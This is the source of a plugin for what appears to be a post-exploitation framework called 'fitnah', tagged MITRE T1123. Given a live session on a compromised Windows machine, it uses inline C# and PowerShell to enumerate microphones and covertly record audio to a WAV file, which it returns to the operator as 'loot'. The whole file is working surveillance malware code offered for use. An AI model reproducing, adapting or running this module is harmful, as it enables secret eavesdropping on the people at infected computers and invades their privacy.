"""collection/audio_capture — record microphone audio via mciSendString Win32 API. MITRE T1123"""
from fitnah.sdk import BasePlugin, ModuleResult, mitre
from fitnah.sdk.schema import Param, ParamSchema


class AudioCapture(BasePlugin):
    NAME        = "audio_capture"
    DESCRIPTION = "Record microphone audio to WAV via mciSendString Win32 API (no external deps)."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1123"
    CATEGORY    = "collection"

    schema = ParamSchema().add(
        Param("duration_sec",  int,  required=False, default=10,    help="Recording duration in seconds"),
        Param("out_file",      str,  required=False, default="",    help="Output WAV path (default: TEMP)"),
        Param("list_devices",  bool, required=False, default=False, help="List available audio input devices"),
    )

    # Inline C# type definition for mciSendString and waveIn enumeration
    _CS_TYPE = (
        "using System;"
        "using System.Runtime.InteropServices;"
        "using System.Text;"
        "public class WinMCI {"
        "  [DllImport(\"winmm.dll\", CharSet=CharSet.Auto)]"
        "  public static extern int mciSendString(string cmd, StringBuilder ret, int retLen, IntPtr hwnd);"
        "  [DllImport(\"winmm.dll\")] public static extern int waveInGetNumDevs();"
        "  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]"
        "  public struct WAVEINCAPS {"
        "    public ushort wMid, wPid; public uint vDriverVersion;"
        "    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string szPname;"
        "    public uint dwFormats, wChannels; public ushort wReserved1;"
        "  }"
        "  [DllImport(\"winmm.dll\", CharSet=CharSet.Auto)]"
        "  public static extern int waveInGetDevCapsW(int uDeviceID, ref WAVEINCAPS pwic, int cbwic);"
        "}"
    )

    @mitre("T1123")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        duration    = int(params.get("duration_sec", 10))
        out_file    = params.get("out_file", "")
        list_devs   = bool(params.get("list_devices", False))

        cs_type = self._CS_TYPE

        if list_devs:
            ps = (
                "Add-Type -TypeDefinition '" + cs_type + "' -Language CSharp;"
                "$n = [WinMCI]::waveInGetNumDevs();"
                "$devs = @();"
                "for ($i = 0; $i -lt $n; $i++) {"
                "  $caps = New-Object WinMCI+WAVEINCAPS;"
                "  $sz = [System.Runtime.InteropServices.Marshal]::SizeOf($caps);"
                "  [WinMCI]::waveInGetDevCapsW($i, [ref]$caps, $sz) | Out-Null;"
                "  $devs += \"[$i] $($caps.szPname)\";"
                "};"
                "\"Audio input devices ($n):`n\" + ($devs -join \"`n\")"
            )
            r = ctx.ps(ps)
            if r["status"] != "ok":
                return ModuleResult.err(r["output"])
            return ModuleResult.ok(data=r["output"])

        ps = (
            "Add-Type -TypeDefinition '" + cs_type + "' -Language CSharp;"
            "$out = if ('" + out_file.replace("'", "''") + "' -ne '') {"
            "  '" + out_file.replace("'", "''") + "'"
            "} else {"
            "  \"$env:TEMP\\audio_$(Get-Random).wav\""
            "};"
            "$results = @();"
            "$sb = New-Object System.Text.StringBuilder(256);"
            "$r = [WinMCI]::mciSendString('open new type waveaudio alias rec', $sb, 256, [IntPtr]::Zero);"
            "if ($r -ne 0) { \"[!] mciSendString open failed: $r\"; exit };"
            "[WinMCI]::mciSendString('set rec time format ms', $sb, 256, [IntPtr]::Zero) | Out-Null;"
            "[WinMCI]::mciSendString('record rec', $sb, 256, [IntPtr]::Zero) | Out-Null;"
            "$results += \"[*] Recording for " + str(duration) + " seconds...\";"
            "Start-Sleep -Seconds " + str(duration) + ";"
            "[WinMCI]::mciSendString('stop rec', $sb, 256, [IntPtr]::Zero) | Out-Null;"
            "$r2 = [WinMCI]::mciSendString(\"save rec `\"$out`\"\", $sb, 256, [IntPtr]::Zero);"
            "[WinMCI]::mciSendString('close rec', $sb, 256, [IntPtr]::Zero) | Out-Null;"
            "if ($r2 -ne 0) {"
            "  $results += \"[!] Save failed: $r2\";"
            "} elseif (Test-Path $out) {"
            "  $sz = (Get-Item $out).Length;"
            "  $results += \"[+] Audio saved: $out\";"
            "  $results += \"    Size: $([Math]::Round($sz/1KB,1)) KB\";"
            "  $results += \"    Duration: " + str(duration) + "s\";"
            "} else {"
            "  $results += \"[-] Output file not found after save\";"
            "};"
            "$results -join \"`n\""
        )

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"], loot_kind="audio_capture")
